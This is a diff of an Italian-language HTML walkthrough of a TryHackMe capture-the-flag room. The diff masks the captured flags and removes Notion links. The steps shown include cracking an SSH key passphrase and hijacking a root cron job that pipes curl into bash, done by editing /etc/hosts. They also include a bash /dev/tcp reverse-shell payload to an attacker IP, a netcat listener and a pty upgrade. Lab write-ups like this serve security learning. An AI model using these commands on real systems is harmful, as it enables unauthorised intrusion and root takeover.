@@ -300,52 +300,6 @@
   
     
     
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-    
     
     
       
@@ -1213,7 +1167,7 @@ Provando a loggarci</p>
 </span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>**<span class="w"> </span>The<span class="w"> </span>server<span class="w"> </span>may<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>upgraded.<span class="w"> </span>See<span class="w"> </span>https://openssh.com/pq.html
 </span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a>Enter<span class="w"> </span>passphrase<span class="w"> </span><span class="k">for</span><span class="w"> </span>key<span class="w"> </span><span class="s1">'key.rsa'</span>:<span class="w"> </span>
 </span></code></pre></div></td></tr></table></div>
-<p>Veniamo bloccati dalla richiesta di una password che non possediamo, ma possiamo provare a crackarla con <a href="https://app.notion.com/p/John-The-Ripper-3d0ee36546c28117b7e4e12b924107ea?pvs=21">John The Ripper</a></p>
+<p>Veniamo bloccati dalla richiesta di una password che non possediamo, ma possiamo provare a crackarla con <strong>John The Ripper</strong></p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1"> 1</a></span>
 <span class="normal"><a href="#__codelineno-6-2"> 2</a></span>
 <span class="normal"><a href="#__codelineno-6-3"> 3</a></span>
@@ -1255,11 +1209,11 @@ Provando a loggarci</p>
 <span class="normal"><a href="#__codelineno-8-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>james@ip-10-130-130-21:~$<span class="w"> </span>ls
 </span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>todo.txt<span class="w">  </span>user.txt
 </span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>james@ip-10-130-130-21:~$<span class="w"> </span>cat<span class="w"> </span>user.txt<span class="w"> </span>
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a>thm<span class="o">{</span>65c1aaf000506e56996822c6281e6bf7<span class="o">}</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a>thm<span class="o">{</span>********************************<span class="o">}</span>
 </span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a>james@ip-10-130-130-21:~$<span class="w"> </span>
 </span></code></pre></div></td></tr></table></div>
 <p>Ora dobbiamo procedere con l'elevazione dei permessi e riuscire a passare a root. Qui dobbiamo seguire una strada sensata..
-Procediamo con il cercare i file SUID (<a href="https://app.notion.com/p/Commands-3d0ee36546c2814b91c9cd1b030791e1?pvs=21">Commands</a>)</p>
+Procediamo con il cercare i file SUID con comandi dedicati:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1"> 1</a></span>
 <span class="normal"><a href="#__codelineno-9-2"> 2</a></span>
 <span class="normal"><a href="#__codelineno-9-3"> 3</a></span>
@@ -1292,7 +1246,7 @@ Procediamo con il cercare i file SUID (<a href="https://app.notion.com/p/Command
 </span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15"></a>-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 </span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16"></a>-rwsr-xr-x 1 root root 477672 Apr 11  2025 /usr/lib/openssh/ssh-keysign
 </span></code></pre></div></td></tr></table></div>
-<p>Niente di interessante, procediamo con la ricerca dei programmi eseguibili senza sudo (<a href="https://app.notion.com/p/Commands-3d0ee36546c2814b91c9cd1b030791e1?pvs=21">Commands</a>)</p>
+<p>Niente di interessante, procediamo con la ricerca dei programmi eseguibili senza sudo:</p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
 <span class="normal"><a href="#__codelineno-10-2">2</a></span>
 <span class="normal"><a href="#__codelineno-10-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>james@ip-10-130-130-21:~$<span class="w"> </span>sudo<span class="w"> </span>-l
@@ -1300,7 +1254,7 @@ Procediamo con il cercare i file SUID (<a href="https://app.notion.com/p/Command
 </span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a>Sorry,<span class="w"> </span>try<span class="w"> </span>again.
 </span></code></pre></div></td></tr></table></div>
 <p>Non conosciamo la password!</p>
-<p>Procediamo allora con il controllare i processi (<a href="https://app.notion.com/p/Commands-3d0ee36546c2814b91c9cd1b030791e1?pvs=21">Commands</a>)</p>
+<p>Procediamo allora con il controllare i processi:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
 <span class="normal"><a href="#__codelineno-11-2">2</a></span>
 <span class="normal"><a href="#__codelineno-11-3">3</a></span>
@@ -1312,7 +1266,7 @@ Procediamo con il cercare i file SUID (<a href="https://app.notion.com/p/Command
 </span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5"></a># [...TRUNCATED...]
 </span></code></pre></div></td></tr></table></div>
 <p>C'è crontab eseguito come root!</p>
-<p>Listiamo i cronjob (<a href="https://app.notion.com/p/Commands-3d0ee36546c2814b91c9cd1b030791e1?pvs=21">Commands</a>)</p>
+<p>Listiamo i cronjob:</p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1"> 1</a></span>
 <span class="normal"><a href="#__codelineno-12-2"> 2</a></span>
 <span class="normal"><a href="#__codelineno-12-3"> 3</a></span>
@@ -1352,15 +1306,15 @@ Procediamo con il cercare i file SUID (<a href="https://app.notion.com/p/Command
 Possiamo modificare a cosa punta <code>overpass.thm</code>, se proviamo a fare
 <code>curl overpass.thm/downloads/src/buildscript.sh | bash</code>
 vediamo che <code>overpass.thm</code> punta a localhost (127.0.0.1)
-Possiamo aprire sulla macchina attaccante un webserver in python che ospita un file <code>buildscript.sh</code> malevolo che crea una reverse-shell (<a href="https://app.notion.com/p/Reverse-Shell-e-Bind-Shell-3d0ee36546c281a9bd75cc9b7ecb91d4?pvs=21">Reverse-Shell e Bind Shell</a>)!
-Dalla macchina attaccante avvio il webserver <code>python3 -m http.server 80</code> e dalla stessa cartella di dove ho avviato il webserver creo questa struttura di file e cartelle <code>downloads/src/buildscript.sh</code> e in <code>buildscript.sh</code> scrivo il payload (<a href="https://app.notion.com/p/Reverse-Shell-e-Bind-Shell-3d0ee36546c281a9bd75cc9b7ecb91d4?pvs=21">Reverse-Shell e Bind Shell</a>)</p>
+Possiamo aprire sulla macchina attaccante un webserver in python che ospita un file <code>buildscript.sh</code> malevolo che crea una reverse shell!
+Dalla macchina attaccante avvio il webserver <code>python3 -m http.server 80</code> e dalla stessa cartella di dove ho avviato il webserver creo questa struttura di file e cartelle <code>downloads/src/buildscript.sh</code> e in <code>buildscript.sh</code> scrivo il payload di reverse shell:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>bash -c 'exec bash -i &amp;&gt;/dev/tcp/192.168.163.29/4444 &lt;&amp;1'
 </span></code></pre></div></td></tr></table></div>
 <p>Dove <code>192.168.163.29</code> è la macchina dove verrà instaurato la reverse shell, IP ottenuto tramite <code>ip a show tun0</code> 
-Subito dopo apriamo subito la porta <code>4444</code> per ricevere la reverse shell usando <a href="https://app.notion.com/p/netcat-3d0ee36546c281c1a236f3af1017b763?pvs=21">netcat</a></p>
+Subito dopo apriamo subito la porta <code>4444</code> per ricevere la reverse shell usando <strong>netcat</strong>:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>nc -lvnp 4444
 </span></code></pre></div></td></tr></table></div>
-<p>A questo punto dobbiamo modificare i <a href="https://app.notion.com/p/DNS-3d0ee36546c281389160df099d06af52?pvs=21">DNS</a> di overpass.thm nella macchina vittima, apriamo con <code>nano /etc/hosts</code> e commentiamo la riga <code>overpass.thm 127.0.0.1</code> e in fondo scriviamo <code>192.168.163.29 overpass.thm</code></p>
+<p>A questo punto dobbiamo modificare la risoluzione di <code>overpass.thm</code> nella macchina vittima, apriamo con <code>nano /etc/hosts</code> e commentiamo la riga <code>overpass.thm 127.0.0.1</code> e in fondo scriviamo <code>192.168.163.29 overpass.thm</code></p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1"> 1</a></span>
 <span class="normal"><a href="#__codelineno-15-2"> 2</a></span>
 <span class="normal"><a href="#__codelineno-15-3"> 3</a></span>
@@ -1416,9 +1370,9 @@ Subito dopo apriamo subito la porta <code>4444</code> per ricevere la reverse sh
 </span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13"></a>src
 </span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14"></a>root@ip-10-130-130-21:~#<span class="w"> </span>cat<span class="w"> </span>root.txt
 </span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15"></a>cat<span class="w"> </span>root.txt
-</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16"></a>thm<span class="o">{</span>7f336f8c359dbac18d54fdd64ea753bb<span class="o">}</span>
+</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16"></a>thm<span class="o">{</span>********************************<span class="o">}</span>
 </span></code></pre></div></td></tr></table></div>
-<p>Nota: solitamente si preferisce stabilizzare la reverse shell: <a href="https://app.notion.com/p/Reverse-Shell-e-Bind-Shell-3d0ee36546c281a9bd75cc9b7ecb91d4?pvs=21">Reverse-Shell e Bind Shell</a></p>
+<p>Nota: solitamente si preferisce stabilizzare la reverse shell (con <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code>).</p>
 
 
 
@@ -1456,10 +1410,38 @@ Subito dopo apriamo subito la porta <code>4444</code> per ricevere la reverse sh
     <div class="md-footer-meta__inner md-grid">
       <div class="md-copyright">
   
+    <div class="md-copyright__highlight">
+      Copyright &copy; Matteo Favaro
+    </div>
+  
   
     Made with
     <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
       Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/favmatteo" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://tryhackme.com/p/matteo.favaro460" target="_blank" rel="noopener" title="TryHackMe Profile" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M224.3-2.5c19.8-11.4 44.2-11.4 64 0L464.2 99c19.8 11.4 32 32.6 32 55.4v203c0 22.9-12.2 44-32 55.4L288.3 514.5a64.16 64.16 0 0 1-64 0L48.5 413c-19.8-11.4-32-32.6-32-55.4v-203c0-22.9 12.2-44 32-55.4zm207.8 360V191.4l-143.8 83v166.1z"/></svg>
     </a>
   
 </div>
@@ -1477,7 +1459,7 @@ Subito dopo apriamo subito la porta <code>4444</code> per ricevere la reverse sh
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.indexes", "navigation.expand", "navigation.top", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.a7633da7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.a7633da7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
       <script src="../../assets/javascripts/bundle.c21346df.min.js"></script>
